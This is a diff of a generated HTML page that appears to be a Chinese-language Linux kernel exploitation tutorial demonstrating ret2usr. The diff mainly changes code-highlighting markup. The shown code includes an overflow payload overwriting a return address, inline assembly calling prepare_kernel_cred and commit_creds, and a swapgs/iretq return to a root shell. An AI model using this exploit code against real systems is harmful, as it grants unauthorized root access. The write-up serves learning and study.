-    <span class="n">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
-
-    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div><p>最后一个问题是我们要在函数中写什么来得到根权限。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">overflow</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">50</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="n">off</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// r12
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbp
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">escalate_privs</span><span class="p">;</span> <span class="c1">// ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="nf">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>最后一个问题是我们要在函数中写什么来得到根权限。</p>
 <h5 id="获得根权限">获得根权限</h5>
 <p>再次提醒一下，内核利用的目标不是通过<code>system(&quot;/bin/sh&quot;)</code>或<code>execve(&quot;/bin/sh&quot;， NULL, NULL)</code>弹出shell，而是在系统中获得根权限，然后弹出根shell。通常，最常见的方法是使用两个函数<code>commit_creds()</code>和<code>prepare_kernel_cred()</code>，这两个函数就在内核空间代码中。我们需要做的是像这样调用这两个函数：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">commit_creds</span><span class="p">(</span><span class="n">prepare_kernel_cred</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
-</code></pre></div><p>由于<code>KASLR</code>被禁用，这些函数所在的地址在每次引导中都是不变的。因此，我们可以通过使用这些shell命令读取<code>/proc/kallsyms</code>文件轻松获得地址：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">cat /proc/kallsyms <span class="p">|</span> grep commit_creds
--&gt; ffffffff814c6410 T commit_creds
-cat /proc/kallsyms <span class="p">|</span> grep prepare_kernel_cred
--&gt; ffffffff814c67f0 T prepare_kernel_cred
-</code></pre></div><p>得到根权限的代码可以这样写（你可以用很多不同的方式来写。它只是简单地连续调用两个函数，使用一个函数的返回值作为另一个函数的参数。我在一篇文章中看到并复制了它）：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">escalate_privs</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
-    <span class="n">__asm__</span><span class="p">(</span>
-        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
-        <span class="s">&#34;movabs rax, 0xffffffff814c67f0;&#34;</span> <span class="c1">//prepare_kernel_cred
-</span><span class="c1"></span>        <span class="s">&#34;xor rdi, rdi;&#34;</span>
-	    <span class="s">&#34;call rax; mov rdi, rax;&#34;</span>
-	    <span class="s">&#34;movabs rax, 0xffffffff814c6410;&#34;</span> <span class="c1">//commit_creds
-</span><span class="c1"></span>	    <span class="s">&#34;call rax;&#34;</span>
-        <span class="p">...</span>
-        <span class="s">&#34;.att_syntax;&#34;</span>
-    <span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div><blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">commit_creds</span><span class="p">(</span><span class="nf">prepare_kernel_cred</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+</span></span></code></pre></div><p>由于<code>KASLR</code>被禁用，这些函数所在的地址在每次引导中都是不变的。因此，我们可以通过使用这些shell命令读取<code>/proc/kallsyms</code>文件轻松获得地址：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /proc/kallsyms <span class="p">|</span> grep commit_creds
+</span></span><span class="line"><span class="cl">-&gt; ffffffff814c6410 T commit_creds
+</span></span><span class="line"><span class="cl">cat /proc/kallsyms <span class="p">|</span> grep prepare_kernel_cred
+</span></span><span class="line"><span class="cl">-&gt; ffffffff814c67f0 T prepare_kernel_cred
+</span></span></code></pre></div><p>得到根权限的代码可以这样写（你可以用很多不同的方式来写。它只是简单地连续调用两个函数，使用一个函数的返回值作为另一个函数的参数。我在一篇文章中看到并复制了它）：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">escalate_privs</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__asm__</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;movabs rax, 0xffffffff814c67f0;&#34;</span> <span class="c1">//prepare_kernel_cred
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="s">&#34;xor rdi, rdi;&#34;</span>
+</span></span><span class="line"><span class="cl">	    <span class="s">&#34;call rax; mov rdi, rax;&#34;</span>
+</span></span><span class="line"><span class="cl">	    <span class="s">&#34;movabs rax, 0xffffffff814c6410;&#34;</span> <span class="c1">//commit_creds
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	    <span class="s">&#34;call rax;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">...</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;.att_syntax;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><blockquote>
 <p>注意我写代码使用了一种非常干净的方式，在C代码中使用英特尔语法编写内联汇编。</p>
 </blockquote>
 <h5 id="返回用户级">返回用户级</h5>
 <p>在当前状态下，如果你只是返回用户级代码来弹出shell，那么你会失望的。原因是在运行上述代码之后，我们仍然在内核模式下执行。为了打开根shell，我们必须返回用户模式。
 基本上，如果内核正常运行，它将使用以下指令中的一条返回用户级：<code>sysretq</code>或<code>iretq</code>（x86_64）。大多数人用<code>iretq</code>，据我所知这是因为<code>sysretq</code>使用更复杂。<code>iretq</code>指令只需要用5个用户级寄存器值按以下顺序设置栈：<code>RIP|CS|RFLAGS|SP|SS</code>。
 进程为这些寄存器跟踪两组不同的值，一组用于用户模式，另一组用于内核模式。因此，在内核模式下完成执行后，它必须恢复到这些寄存器的用户模式值。我们可以简单地设置<code>RIP</code>为弹出shell的函数的地址。如果我们随机设置其他寄存器，进程可能不会继续按预期执行。为了解决这个问题，人们想到了一个非常聪明的方法：在进入内核模式之前保存这些寄存器的状态，在获得根权限后重新加载它们。保存状态的函数如下：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">save_state</span><span class="p">(){</span>
-    <span class="n">__asm__</span><span class="p">(</span>
-        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
-        <span class="s">&#34;mov user_cs, cs;&#34;</span>
-        <span class="s">&#34;mov user_ss, ss;&#34;</span>
-        <span class="s">&#34;mov user_sp, rsp;&#34;</span>
-        <span class="s">&#34;pushf;&#34;</span>
-        <span class="s">&#34;pop user_rflags;&#34;</span>
-        <span class="s">&#34;.att_syntax;&#34;</span>
-    <span class="p">);</span>
-    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Saved state&#34;</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div><p>还有一件事，x86_64上还有一个叫做<code>swapgs</code>的指令必须在<code>iretq</code>之前被调用。这条指令的目的是在内核模式和用户模式之间交换<code>GS</code>寄存器。有了所有这些信息，我们可以完成获得root权限的代码，之后返回用户模式：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_rip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">get_shell</span><span class="p">;</span>
-
-<span class="kt">void</span> <span class="nf">escalate_privs</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
-    <span class="n">__asm__</span><span class="p">(</span>
-        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
-        <span class="s">&#34;movabs rax, 0xffffffff814c67f0;&#34;</span> <span class="c1">//prepare_kernel_cred
-</span><span class="c1"></span>        <span class="s">&#34;xor rdi, rdi;&#34;</span>
-	    <span class="s">&#34;call rax; mov rdi, rax;&#34;</span>
-	    <span class="s">&#34;movabs rax, 0xffffffff814c6410;&#34;</span> <span class="c1">//commit_creds
-</span><span class="c1"></span>	    <span class="s">&#34;call rax;&#34;</span>
-        <span class="s">&#34;swapgs;&#34;</span>
-        <span class="s">&#34;mov r15, user_ss;&#34;</span>
-        <span class="s">&#34;push r15;&#34;</span>
-        <span class="s">&#34;mov r15, user_sp;&#34;</span>
-        <span class="s">&#34;push r15;&#34;</span>
-        <span class="s">&#34;mov r15, user_rflags;&#34;</span>
-        <span class="s">&#34;push r15;&#34;</span>
-        <span class="s">&#34;mov r15, user_cs;&#34;</span>
-        <span class="s">&#34;push r15;&#34;</span>
-        <span class="s">&#34;mov r15, user_rip;&#34;</span>
-        <span class="s">&#34;push r15;&#34;</span>
-        <span class="s">&#34;iretq;&#34;</span>
-        <span class="s">&#34;.att_syntax;&#34;</span>
-    <span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div><p>最终，我们可以以指定顺序调用精心设计的代码片段，打开根shell：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-    <span class="n">save_state</span><span class="p">();</span>
-    <span class="n">open_dev</span><span class="p">();</span>
-    <span class="n">leak</span><span class="p">();</span>
-    <span class="n">overflow</span><span class="p">();</span>  
-    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
-    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div><h4 id="总结">总结</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">save_state</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__asm__</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov user_cs, cs;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov user_ss, ss;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov user_sp, rsp;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;pushf;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;pop user_rflags;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;.att_syntax;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] Saved state&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>还有一件事，x86_64上还有一个叫做<code>swapgs</code>的指令必须在<code>iretq</code>之前被调用。这条指令的目的是在内核模式和用户模式之间交换<code>GS</code>寄存器。有了所有这些信息，我们可以完成获得root权限的代码，之后返回用户模式：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_rip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">get_shell</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">escalate_privs</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__asm__</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;movabs rax, 0xffffffff814c67f0;&#34;</span> <span class="c1">//prepare_kernel_cred
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="s">&#34;xor rdi, rdi;&#34;</span>
+</span></span><span class="line"><span class="cl">	    <span class="s">&#34;call rax; mov rdi, rax;&#34;</span>
+</span></span><span class="line"><span class="cl">	    <span class="s">&#34;movabs rax, 0xffffffff814c6410;&#34;</span> <span class="c1">//commit_creds
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	    <span class="s">&#34;call rax;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;swapgs;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r15, user_ss;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;push r15;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r15, user_sp;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;push r15;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r15, user_rflags;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;push r15;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r15, user_cs;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;push r15;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r15, user_rip;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;push r15;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;iretq;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;.att_syntax;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>最终，我们可以以指定顺序调用精心设计的代码片段，打开根shell：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">save_state</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">open_dev</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">leak</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">overflow</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h4 id="总结">总结</h4>
 <p>以上就是我关于Linux内核利用学习过程的第一篇文章。在这篇文章中，我演示了如何为Linux内核pwn设置环境，以及内核利用中最简单的技术：<code>ret2usr</code>。
 在下一篇文章中，我将通过添加越来越多的保护功能来逐渐增加难度，并向您展示相应的绕过技术。</p>
 <h4 id="附录">附录</h4>
@@ -385,7 +384,7 @@ cat /proc/kallsyms <span class="p">|</span> grep prepare_kernel_cred
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.92.2">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.118.2">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
                 </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="../../../" target="_blank">admin</a></span></div>
         </div>
     </footer></div>
